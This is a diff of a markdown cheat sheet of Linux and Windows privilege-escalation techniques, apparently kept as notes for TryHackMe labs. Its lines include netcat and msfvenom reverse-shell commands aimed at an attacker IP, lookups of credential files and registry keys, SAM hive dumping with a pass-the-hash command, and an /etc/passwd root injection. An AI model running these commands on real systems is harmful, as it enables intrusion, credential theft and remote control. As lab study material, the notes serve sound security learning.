@@ -3,7 +3,7 @@
 
 # Linux Privilage Escalation
 
-# Useful Paths and Commands for Enumeration
+## Useful Paths and Commands for Enumeration
 
 < /proc/version > `provides information about the target system processes.`
  
@@ -67,7 +67,7 @@
   - find / -perm -u=s -type f 2>/dev/null: `Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.`
   - find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null `for more info on files with SUID set` 
  
-# Automated Enumeration Tools
+## Automated Enumeration Tools
 
   - LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
   - LinEnum: https://github.com/rebootuser/LinEnum
@@ -75,7 +75,7 @@
   - Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
   - Linux Priv Checker: https://github.com/linted/linuxprivchecker
 
-# Privilege Escalation: Kernel Exploits
+## Privilege Escalation: Kernel Exploits
 
   - Find version of system
   - Exploit-db: https://www.exploit-db.com
@@ -83,12 +83,12 @@
   - Google: https://www.google.com
   - Searchsploit
   
-# Privilege Escalation: Sudo
+## Privilege Escalation: Sudo
 
   - sudo -l: `Check root privilages`
   - GTFObins: https://gtfobins.github.io/
 
-# Privilege Escalation: SUID
+## Privilege Escalation: SUID
 
   - find / -type f -perm -04000 -ls 2>/dev/null: `list files that have SUID or SGID bits set.`
   - GTFObins: https://gtfobins.github.io/
@@ -98,17 +98,17 @@
   - openssl passwd -1 salt THM password1
   - add "root:/bin/bash" to end of user in /etc/passwd
 
-# Privilege Escalation: Capabilities
+## Privilege Escalation: Capabilities
 
   - getcap -r / 2>/dev/null: `list enabled capabilities.`
   - GTFObins: https://gtfobins.github.io/
 
-# Privilege Escalation: Cron Jobs
+## Privilege Escalation: Cron Jobs
 
   - /etc/crontab: `read the file keeping system-wide cron jobs`
 - *See if any files can be edited, to run a payload or start a reverse shell*
 
-# Privilege Escalation: PATH
+## Privilege Escalation: PATH
 
   - echo $PATH: `Show the PATH variable`
   1. What folders are located under $PATH
@@ -133,7 +133,7 @@
 - *if able to, add path to the $PATH env variable*
   - export PATH=/tmp:$PATH `replace {/tmp} with the path to add`
 
-# Privilege Escalation: NFS
+## Privilege Escalation: NFS
 
   - /etc/exports `List NFS (Network File Sharing) configuration. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.`
 - *On attacker machine*
@@ -146,7 +146,7 @@
   
 # Windows Privilage Escalation
 
-# Unattended Windows Installations
+## Unattended Windows Installations
 Usual files that may contain credentials:
   - C:\Unattend.xml
   - C:\Windows\Panther\Unattend.xml
@@ -154,14 +154,14 @@ Usual files that may contain credentials:
   - C:\Windows\system32\sysprep.inf
   - C:\Windows\system32\sysprep\sysprep.xml
 
-# Powershell History
+## Powershell History
   - type {user-profile}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
   
-# Saved Windows Credentials
+## Saved Windows Credentials
   - cmdkey /list
   - runas /savecred /user:{user} cmd.exe
   
-# IIS Configuration
+## IIS Configuration
   `We can find web.config in one of the following locations:`
   - C:\inetpub\wwwroot\web.config
   - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
@@ -172,17 +172,17 @@ Usual files that may contain credentials:
   - cat C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
   - cat C:\inetpub\wwwroot\web.config | findstr connectionString
   
-# Retrieve Credentials from Software: PuTTY
+## Retrieve Credentials from Software: PuTTY
   - reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s `search under the following registry key for ProxyPassword`
   
-# Scheduled Tasks
+## Scheduled Tasks
   - schtasks `Lists all scheduled tasks`
   - schtasks /query /tn {TASK_NAME} /fo list /v  `List detailed information about the task specific`
   - icacls {Task to run} `To check the file permissions on the executable`
 - *if able to modify the executable, you are able to execute scripts/reverse shell*
   - echo c:\tools\nc64.exe -e cmd.exe {ATTACKER_IP} {ATTACKER_LISTENING_PORT} > {Task to run} `eg: echo c:\tools\nc64.exe -e cmd.exe 10.10.10.18 4444 > C:\tasks\schtask.bat`
   
-# AlwaysInstallElevated
+## AlwaysInstallElevated
 - *Requires these two values to be set*
   - reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
   - reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
@@ -190,7 +190,7 @@ Usual files that may contain credentials:
   - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
   - msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
 
-# Insecure Permissions on Service Executable
+## Insecure Permissions on Service Executable
   - sc qc {taskname} `sc qc WindowsScheduler`
   - icacls {path} `check permissions, eg: icacls C:\PROGRA~2\SYSTEM~1\WService.exe`
 - *if able to edit the folder content/file*
@@ -207,7 +207,7 @@ Usual files that may contain credentials:
   - sc stop windowsscheduler
   - sc start windowsscheduler `restart service to get reverse shell`
   
-# Unquoted Service Paths
+## Unquoted Service Paths
 - *CORRECT - "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service*
 - *WRONG - C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe*
   - *Windows will run*
@@ -226,7 +226,7 @@ Usual files that may contain credentials:
 - "on attacker machine"
   - nc -lnvp {PORT} `start listener`
   
-# Insecure Service Permissions
+## Insecure Service Permissions
   - accesschk64.exe -qlc {service} `check service permissions`
 - *on attacker machine*
   - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
@@ -238,7 +238,7 @@ Usual files that may contain credentials:
   - sc stop THMservice
   - sc start THMservice
 
-# SeBackup / SeRestore
+## SeBackup / SeRestore
 - *When a certain user has permissions to perform backups from a system without having full administrative privileges*
   - whoami /priv `check our privileges`
     - SeBackupPrivilege
@@ -253,7 +253,7 @@ Usual files that may contain credentials:
   - /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
   - /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP `Pass the hash attack`
   
-# SeTakeOwnership
+## SeTakeOwnership
 - *SeTakeOwnership privilege allows a user to take ownership of any object on the system, can hijack objects*
   - whoami /priv
     - SeTakeOwnershipPrivilege
@@ -263,7 +263,7 @@ Usual files that may contain credentials:
     - C:\Windows\System32\> copy cmd.exe utilman.exe
     - Start > Lock Screen > Ease of Access
   
-# SeImpersonate / SeAssignPrimaryToken
+## SeImpersonate / SeAssignPrimaryToken
   - Rougepotato: https://github.com/antonioCoco/RoguePotato 
   `Only works if DCOM is enabled on the target Machine, use "PrintSpoofer" as alternative https://github.com/itm4n/PrintSpoofer`
 - *on attacker machine*
@@ -275,7 +275,7 @@ Usual files that may contain credentials:
  - PrintSpoofer: https://github.com/dievus/printspoofer / https://github.com/itm4n/PrintSpoofer
   - PrintSpoofer.exe -i -c cmd
   
-# Tools of the trade
+## Tools of the trade
   - WinPEAS https://github.com/carlospolop/PEASS-ng `uncover privilege escalation paths`
     - winpeas.exe > outputfile.txt
   - PrivescCheck https://github.com/itm4n/PrivescCheck
@@ -292,7 +292,7 @@ Usual files that may contain credentials:
     - *if attacker has a metapreter shell*
     - can use metasploit's "multi/recon/local_exploit_suggester" module to check for vulnerabilities
 
-# Additional Tools
+## Additional Tools
   - PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
   - Priv2Admin https://github.com/gtworek/Priv2Admin
   - RogueWinRM https://github.com/antonioCoco/RogueWinRM
